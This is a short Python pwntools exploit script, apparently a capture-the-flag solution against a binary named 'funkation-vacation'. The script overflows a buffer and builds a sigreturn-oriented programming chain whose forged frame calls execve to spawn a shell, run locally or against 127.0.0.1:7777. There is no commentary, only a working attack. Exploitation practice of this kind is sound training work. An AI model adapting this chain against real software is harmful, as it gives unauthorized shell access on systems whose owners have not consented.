from pwn import *

elf = context.binary = ELF("./funkation-vacation")
context.log_level = "debug"
if args.REMOTE:
    p = remote("127.0.0.1", 7777)
elif args.GDB:
    p =gdb.debug("./funkation-vacation")
else:
    p = process()

offset = 8
pop_rax_ret = 0x0000000000043014
syscall = 0x0000000000043011
ret = 0x0000000000043013
frame = SigreturnFrame()
frame.rax = 59  # execve syscall number
frame.rdi = 0x43018  # binsh address
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
payload = cyclic(offset) +pack(pop_rax_ret) + pack(15) + pack(syscall) + bytes(frame)

p.sendline(payload)

p.interactive()
